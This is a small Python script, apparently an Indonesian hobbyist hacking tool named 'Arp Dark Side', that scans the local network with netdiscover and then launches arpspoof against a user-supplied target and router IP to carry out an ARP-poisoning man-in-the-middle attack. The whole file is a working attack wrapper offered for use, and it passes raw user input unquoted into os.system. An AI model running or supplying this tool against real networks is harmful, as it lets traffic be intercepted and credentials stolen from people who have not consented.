import os

print("""

   _____                   ________                    __      _________.__     .___        
  /  _  \  _______ ______  \______ \  _____   _______ |  | __ /   _____/|__|  __| _/  ____  
 /  /_\  \ \_  __ \\____ \  |    |  \ \__  \  \_  __ \|  |/ / \_____  \ |  | / __ | _/ __ \ 
/    |    \ |  | \/|  |_> > |    `   \ / __ \_ |  | \/|    <  /        \|  |/ /_/ | \  ___/ 
\____|__  / |__|   |   __/ /_______  /(____  / |__|   |__|_ \/_______  /|__|\____ |  \___  >
        \/         |__|            \/      \/              \/        \/          \/      \/ 
                            
                            Made It By Reagen Leonardo
                                  "COPYRIGHT"
""")


print("Harap Gunakan Tool Ini Dengan Bijak\n\n")

while True:
    scan = input("Lakukukan Scanning ? (y/n) : ")
    if scan == "y":
        os.system("sudo netdiscover")

    elif scan != "y":
        os.system("clear")
        continue

    while True:
        command = input("\nMasukkan Interface Anda : ")
        if command == "wlan0":
            a = input("\nMasukkan Ip Target : ")
            b = input("\nMasukkan Ip Router : ")
            print("\n")

            os.system(f"arpspoof -i {command} -t {a} -r {b}")

            os.system("clear")
            print("Untuk Berhenti Tekan Ctrl + C\n")
            break

        elif command != "wlan0":
            print("Interface Tidak Dikenali")
            continue
